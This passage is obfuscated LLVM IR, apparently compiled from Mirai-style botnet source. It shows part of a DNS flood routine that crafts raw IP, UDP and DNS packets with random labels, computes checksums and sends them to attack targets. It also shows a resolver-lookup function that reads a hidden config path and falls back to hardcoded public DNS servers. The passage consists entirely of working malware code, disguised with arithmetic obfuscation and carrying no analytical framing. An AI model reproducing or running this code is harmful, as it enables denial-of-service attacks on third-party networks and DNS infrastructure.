  %407 = or i32 %404, %405
  %408 = or i32 -121632391, %406
  %409 = xor i32 %407, -1
  %410 = and i32 %409, %408
  %411 = and i32 %403, 65535
  %412 = trunc i32 %410 to i16
  %413 = load %struct.dnshdr*, %struct.dnshdr** %36, align 8
  %414 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %413, i32 0, i32 0
  store i16 %412, i16* %414, align 2
  br label %415

; <label>:415:                                    ; preds = %402, %398
  %416 = load i8*, i8** %37, align 8
  %417 = load i8, i8* %19, align 1
  %418 = zext i8 %417 to i32
  %419 = call i32 (i8*, i32, ...) bitcast (i32 (...)* @rand_alphastr to i32 (i8*, i32, ...)*)(i8* %416, i32 %418)
  %420 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %421 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %420, i32 0, i32 7
  store i16 0, i16* %421, align 2
  %422 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %423 = bitcast %struct.iphdr* %422 to i16*
  %424 = call zeroext i16 @checksum_generic(i16* %423, i32 20)
  %425 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %426 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %425, i32 0, i32 7
  store i16 %424, i16* %426, align 2
  %427 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %428 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %427, i32 0, i32 3
  store i16 0, i16* %428, align 2
  %429 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %430 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %431 = bitcast %struct.udphdr* %430 to i8*
  %432 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %433 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %432, i32 0, i32 2
  %434 = load i16, i16* %433, align 2
  %435 = load i8, i8* %19, align 1
  %436 = zext i8 %435 to i64
  %437 = sub i64 0, 21
  %438 = sub i64 0, %436
  %439 = add i64 %437, %438
  %440 = sub i64 0, %439
  %441 = add i64 21, %436
  %442 = sub i64 %440, -5993428073882314087
  %443 = add i64 %442, 2
  %444 = add i64 %443, -5993428073882314087
  %445 = add i64 %440, 2
  %446 = load i32, i32* %21, align 4
  %447 = sext i32 %446 to i64
  %448 = sub i64 %444, 4806067160124097120
  %449 = add i64 %448, %447
  %450 = add i64 %449, 4806067160124097120
  %451 = add i64 %444, %447
  %452 = add i64 %450, -8442102638700101617
  %453 = add i64 %452, 4
  %454 = sub i64 %453, -8442102638700101617
  %455 = add i64 %450, 4
  %456 = trunc i64 %454 to i32
  %457 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %429, i8* %431, i16 zeroext %434, i32 %456)
  %458 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %459 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %458, i32 0, i32 3
  store i16 %457, i16* %459, align 2
  %460 = load i32, i32* %22, align 4
  %461 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %462 = load i32, i32* %9, align 4
  %463 = sext i32 %462 to i64
  %464 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %461, i64 %463
  %465 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %464, i32 0, i32 0
  %466 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %465, i32 0, i32 2
  %467 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %466, i32 0, i32 0
  store i32 %460, i32* %467, align 4
  %468 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %469 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %468, i32 0, i32 1
  %470 = load i16, i16* %469, align 2
  %471 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %472 = load i32, i32* %9, align 4
  %473 = sext i32 %472 to i64
  %474 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %471, i64 %473
  %475 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %474, i32 0, i32 0
  %476 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %475, i32 0, i32 1
  store i16 %470, i16* %476, align 2
  %477 = load i32, i32* %10, align 4
  %478 = load i8*, i8** %33, align 8
  %479 = load i8, i8* %19, align 1
  %480 = zext i8 %479 to i64
  %481 = sub i64 0, %480
  %482 = sub i64 41, %481
  %483 = add i64 41, %480
  %484 = add i64 %482, 851015140700703133
  %485 = add i64 %484, 2
  %486 = sub i64 %485, 851015140700703133
  %487 = add i64 %482, 2
  %488 = load i32, i32* %21, align 4
  %489 = sext i32 %488 to i64
  %490 = sub i64 %486, -5353378881011961185
  %491 = add i64 %490, %489
  %492 = add i64 %491, -5353378881011961185
  %493 = add i64 %486, %489
  %494 = sub i64 0, 4
  %495 = sub i64 %492, %494
  %496 = add i64 %492, 4
  %497 = bitcast %union.__CONST_SOCKADDR_ARG* %38 to %struct.sockaddr**
  %498 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %499 = load i32, i32* %9, align 4
  %500 = sext i32 %499 to i64
  %501 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %498, i64 %500
  %502 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %501, i32 0, i32 0
  %503 = bitcast %struct.sockaddr_in* %502 to %struct.sockaddr*
  store %struct.sockaddr* %503, %struct.sockaddr** %497, align 8
  %504 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %38, i32 0, i32 0
  %505 = load %struct.sockaddr*, %struct.sockaddr** %504, align 8
  %506 = call i64 @sendto(i32 %477, i8* %478, i64 %495, i32 16384, %struct.sockaddr* %505, i32 16)
  br label %507

; <label>:507:                                    ; preds = %415
  %508 = load i32, i32* %9, align 4
  %509 = add i32 %508, 1287787138
  %510 = add i32 %509, 1
  %511 = sub i32 %510, 1287787138
  %512 = add nsw i32 %508, 1
  store i32 %511, i32* %9, align 4
  br label %332

; <label>:513:                                    ; preds = %332
  br label %331

; <label>:514:                                    ; preds = %93, %87, %81
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 46)
  %11 = call i8* @table_retrieve_val(i32 46, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 46)
  %13 = load i32, i32* %2, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %106

; <label>:15:                                     ; preds = %0
  %16 = load i32, i32* %2, align 4
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %18 = call i64 @read(i32 %16, i8* %17, i64 2048)
  %19 = trunc i64 %18 to i32
  store i32 %19, i32* %3, align 4
  %20 = load i32, i32* %2, align 4
  %21 = call i32 @close(i32 %20)
  call void @table_unlock_val(i8 zeroext 47)
  %22 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %23 = load i32, i32* %3, align 4
  %24 = call i8* @table_retrieve_val(i32 47, i32* null)
  %25 = call i32 @util_stristr(i8* %22, i32 %23, i8* %24)
  store i32 %25, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 47)
  %26 = load i32, i32* %4, align 4
  %27 = icmp ne i32 %26, -1
  br i1 %27, label %28, label %105

; <label>:28:                                     ; preds = %15
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %29 = load i32, i32* %4, align 4
  store i32 %29, i32* %6, align 4
  br label %30

; <label>:30:                                     ; preds = %92, %28
  %31 = load i32, i32* %6, align 4
  %32 = load i32, i32* %3, align 4
  %33 = icmp slt i32 %31, %32
  br i1 %33, label %34, label %98

; <label>:34:                                     ; preds = %30
  %35 = load i32, i32* %6, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  store i8 %38, i8* %10, align 1
  %39 = load i8, i8* %8, align 1
  %40 = icmp ne i8 %39, 0
  br i1 %40, label %52, label %41

; <label>:41:                                     ; preds = %34
  %42 = load i8, i8* %10, align 1
  %43 = sext i8 %42 to i32
  %44 = icmp eq i32 %43, 32
  br i1 %44, label %49, label %45

; <label>:45:                                     ; preds = %41
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 9
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %45, %41
  br label %92

; <label>:50:                                     ; preds = %45
  store i8 1, i8* %8, align 1
  br label %51

; <label>:51:                                     ; preds = %50
  br label %52

; <label>:52:                                     ; preds = %51, %34
  %53 = load i8, i8* %10, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp ne i32 %54, 46
  br i1 %55, label %56, label %64

; <label>:56:                                     ; preds = %52
  %57 = load i8, i8* %10, align 1
  %58 = sext i8 %57 to i32
  %59 = icmp slt i32 %58, 48
  br i1 %59, label %72, label %60

; <label>:60:                                     ; preds = %56
  %61 = load i8, i8* %10, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp sgt i32 %62, 57
  br i1 %63, label %72, label %64

; <label>:64:                                     ; preds = %60, %52
  %65 = load i32, i32* %6, align 4
  %66 = load i32, i32* %3, align 4
  %67 = add i32 %66, 1120330722
  %68 = sub i32 %67, 1
  %69 = sub i32 %68, 1120330722
  %70 = sub nsw i32 %66, 1
  %71 = icmp eq i32 %65, %69
  br i1 %71, label %72, label %91

; <label>:72:                                     ; preds = %64, %60, %56
  %73 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %74 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %75 = load i32, i32* %4, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i8, i8* %74, i64 %76
  %78 = load i32, i32* %6, align 4
  %79 = load i32, i32* %4, align 4
  %80 = sub i32 %78, -210565201
  %81 = sub i32 %80, %79
  %82 = add i32 %81, -210565201
  %83 = sub nsw i32 %78, %79
  call void @util_memcpy(i8* %73, i8* %77, i32 %82)
  %84 = load i32, i32* %6, align 4
  %85 = load i32, i32* %4, align 4
  %86 = sub i32 0, %85
  %87 = add i32 %84, %86
  %88 = sub nsw i32 %84, %85
  %89 = sext i32 %87 to i64
  %90 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %89
  store i8 0, i8* %90, align 1
  store i8 1, i8* %9, align 1
  br label %98

; <label>:91:                                     ; preds = %64
  br label %92

; <label>:92:                                     ; preds = %91, %49
  %93 = load i32, i32* %6, align 4
  %94 = add i32 %93, -457556178
  %95 = add i32 %94, 1
  %96 = sub i32 %95, -457556178
  %97 = add nsw i32 %93, 1
  store i32 %96, i32* %6, align 4
  br label %30

; <label>:98:                                     ; preds = %72, %30
  %99 = load i8, i8* %9, align 1
  %100 = icmp ne i8 %99, 0
  br i1 %100, label %101, label %104

; <label>:101:                                    ; preds = %98
  %102 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %103 = call i32 @inet_addr(i8* %102) #6
  store i32 %103, i32* %1, align 4
  br label %117

; <label>:104:                                    ; preds = %98
  br label %105

; <label>:105:                                    ; preds = %104, %15
  br label %106

; <label>:106:                                    ; preds = %105, %0
  %107 = call i32 @rand_next()
  %108 = urem i32 %107, 4
  switch i32 %108, label %117 [
    i32 0, label %109
    i32 1, label %111
    i32 2, label %113
    i32 3, label %115
  ]

; <label>:109:                                    ; preds = %106
  %110 = call i32 @htonl(i32 134744072) #7
  store i32 %110, i32* %1, align 4
  br label %117

; <label>:111:                                    ; preds = %106
  %112 = call i32 @htonl(i32 1246898730) #7
  store i32 %112, i32* %1, align 4
  br label %117

; <label>:113:                                    ; preds = %106
  %114 = call i32 @htonl(i32 1074151430) #7
  store i32 %114, i32* %1, align 4
  br label %117

; <label>:115:                                    ; preds = %106
  %116 = call i32 @htonl(i32 67240450) #7
  store i32 %116, i32* %1, align 4
  br label %117

; <label>:117:                                    ; preds = %115, %113, %111, %109, %106, %101
  %118 = load i32, i32* %1, align 4
  ret i32 %118
}

declare i32 @rand_alphastr(...) #3

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146846634}
!2 = !{i32 -2146846225}
